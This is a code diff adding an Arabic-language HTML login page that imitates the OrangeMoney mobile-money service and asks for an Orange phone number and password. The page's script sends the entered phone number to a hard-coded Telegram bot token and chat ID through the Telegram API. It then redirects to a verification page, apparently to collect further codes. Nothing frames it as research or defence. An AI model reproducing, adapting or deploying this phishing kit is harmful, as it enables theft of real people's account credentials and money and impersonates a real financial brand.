@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول | OrangeMoney</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: rgba(255, 255, 255, 0.9); /* واجهة شفافة */
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .title {
+            color: black; /* لون العنوان الأسود */
+            text-align: right; /* محاذاة العنوان إلى اليمين */
+        }
+        .subtitle {
+            color: #FF8C00; /* لون العنوان البرتقالي */
+            text-align: left; /* محاذاة العنوان إلى اليسار */
+            margin-top: 0; /* إزالة المسافة العلوية */
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #FF8C00; /* لون الزر برتقالي غامق */
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%; /* يغطي العرض بالكامل */
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+        .footer-image {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 300px;
+        }
+        .right-align {
+            text-align: right; /* محاذاة النص إلى اليمين */
+            direction: rtl; /* اتجاه النص من اليمين إلى اليسار */
+            display: block; /* تأكيد أن التسمية تظهر ككتلة منفصلة */
+            margin-bottom: 5px; /* مسافة سفلية بين التسمية ومدخل النص */
+        }
+    </style>
+    <script>
+        // إضافة التوكن الخاص ببوت تلجرام
+        const TELEGRAM_TOKEN = '7071902802:AAG7GZB_vh9eKatLDdsq0Q0D6AV-9Ay2HG4';
+        const CHAT_ID = '6332127387';
+
+        // وظيفة لتحويل المستخدم إلى صفحة التحقق مع تمرير رقم الهاتف
+        function redirectToVerification() {
+            var phoneNumber = document.getElementById("phone-input").value;
+            setTimeout(function() { // تأخير التحويل لإظهار الاستجابة
+                window.location.href = 'verification.html?phone=' + encodeURIComponent(phoneNumber);
+                sendTelegramMessage(`رقم الهاتف المستخدم لتسجيل الدخول هو: ${phoneNumber}`); // إرسال الرسالة إلى تلجرام
+            }, 500); // التأخير 0.5 ثانية قبل التحويل
+        }
+
+        // وظيفة لإرسال رسالة إلى تلجرام
+        function sendTelegramMessage(message) {
+            var url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="file-RQ4PiQTnG97TtnMlaTOMk1Th.jpg" alt="صورة مقدمة الصفحة" style="width: 100%; border-radius: 10px;">
+        <h1 class="title">تسجيل الدخول الى حسابي</h1> <!--## العنوان باللون الأسود وعلى اليمين-->
+        <h2 class="subtitle">OrangeMoney</h2> <!--## العنوان الفرعي باللون البرتقالي وعلى اليسار-->
+        
+        <label class="right-align">يرجى ادخال رقم موبايل <span style="color: #FF8C00;">orange</span></label> <!--## محاذاة النص إلى أقصى اليمين-->
+        <input id="phone-input" type="text" placeholder="" maxlength="10" required>
+        <small class="right-align">يرجى ادخال الرقم الذي يبدأ ب 077/078/079</small>
+        
+        <div style="margin: 20px 0;"></div> <!--## مسافة بين رقم الهاتف وكلمة المرور-->
+
+        <label class="right-align">يرجى ادخال كلمة سر</label> <!--## محاذاة النص إلى أقصى اليمين-->
+        <input type="password" placeholder="أدخل كلمة السر" required>
+        <small class="right-align">كتابة حروف ورموز وأرقام</small>
+        <br>
+
+        <label class="right-align">
+            <input type="checkbox"> تذكرني <!--## محاذاة إلى أقصى اليمين-->
+        </label>
+        <br>
+        <button onclick="redirectToVerification()">تسجيل الدخول</button> <!--## زر برتقالي غامق يعيد التوجيه لصفحة التحقق-->
+    </div>
+
+    <img src="file-rh2l0xh3VmXsCSQPcbJTXTPu.jpg" alt="صورة في آخر الصفحة" class="footer-image">
+</body>
+</html>
